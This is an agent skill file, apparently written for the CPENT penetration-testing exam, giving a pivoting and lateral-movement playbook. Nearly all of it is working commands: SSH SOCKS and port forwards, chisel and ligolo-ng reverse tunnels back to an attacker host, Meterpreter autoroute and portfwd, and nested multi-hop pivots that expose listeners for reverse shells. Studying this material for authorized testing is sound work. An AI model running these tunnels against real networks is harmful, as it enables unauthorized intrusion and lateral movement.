---
name: pivoting
description: Pivoting and lateral movement playbook for CPENT — SSH SOCKS/port-forward, chisel, ligolo-ng, meterpreter autoroute, and double/triple pivots. Use the moment you compromise a dual-NIC host. Only 5% of marks but it gates whole ranges.
---

# Pivoting & Lateral Movement (Zone 8, 5% — CRITICAL: gates other ranges)

If you can't pivot you can't reach AD/OT/hidden segments worth far more. The moment a
compromised host shows a second interface, build the tunnel and update the map.

## SSH dynamic SOCKS (most reliable when SSH exists)

```
ssh -fN -D 1080 user@pivot-host
# /etc/proxychains.conf:  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 22,80,445,3389 <internal-target>   # -sT -Pn is mandatory over SOCKS
```

## SSH port-forwarding

```
ssh -L 8080:<internal-target>:80 user@pivot     # local: reach a remote service locally
ssh -R 4444:127.0.0.1:4444 user@pivot           # remote: expose your listener inward
```

## Chisel (no SSH)

```
# attacker:  chisel server -p 8080 --reverse
# pivot:     chisel client <attacker-ip>:8080 R:socks
# then proxychains via socks5 127.0.0.1 1080
```

## Ligolo-ng (cleanest multi-hop — no proxychains needed)

Ligolo gives you a real tun interface, so tools run natively (full nmap, no `-sT -Pn`):
```
# attacker (once): create the interface and start the listener
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# on the pivot: run the agent back to you
./agent -connect <attacker-ip>:11601 -ignore-cert

# back in the proxy console: pick the session, then route the internal subnet via ligolo:
session            # select the agent
# (new terminal) add the route to the tun:
sudo ip route add 172.16.20.0/24 dev ligolo
start              # in the proxy console — traffic to that subnet now tunnels
# Reach a service on YOUR box from the internal net (e.g. for a reverse shell):
#   in proxy console:  listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```
Double pivot: run a second agent on the Tier-2 host, add its subnet as another route.

## Meterpreter autoroute (best when you already have a Meterpreter session)

```
# From inside the Meterpreter session:
run autoroute -s 172.16.20.0/24        # add route to internal subnet
run autoroute -p                        # verify routes

# Then background and set up SOCKS proxy:
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Port-forward a single service (faster than SOCKS for one target):
portfwd add -l 8080 -p 80 -r <internal-target>     # access internal:80 at localhost:8080
portfwd add -l 3389 -p 3389 -r <internal-target>   # RDP
portfwd add -l 445 -p 445 -r <internal-target>     # SMB for crackmapexec

# Reverse port forward (expose your listener into the internal net):
portfwd add -R -l 4444 -p 4444 -L 0.0.0.0
```

## Double / triple pivot

Chain tunnels when a deeper net is only reachable through an intermediate host:
1. Compromise Tier-1, SOCKS/autoroute to Tier-2.
2. Through that tunnel, compromise Tier-2.
3. From Tier-2, open a second tunnel to Tier-3; nest the SOCKS proxies.
4. **Test each hop with one known port first** (`proxychains curl http://<t>`) before full
   scans. Ligolo-ng is excellent for clean multi-hop; `socat`/`netsh portproxy`/`plink` for
   single-port relays on constrained hosts.

## Always update the map

Edit `engagement/network-map.md`: attacker → pivot1 (ext/int IPs) → pivot2 → targets, and
mark every dual-NIC host. A stale map loses you a segment.
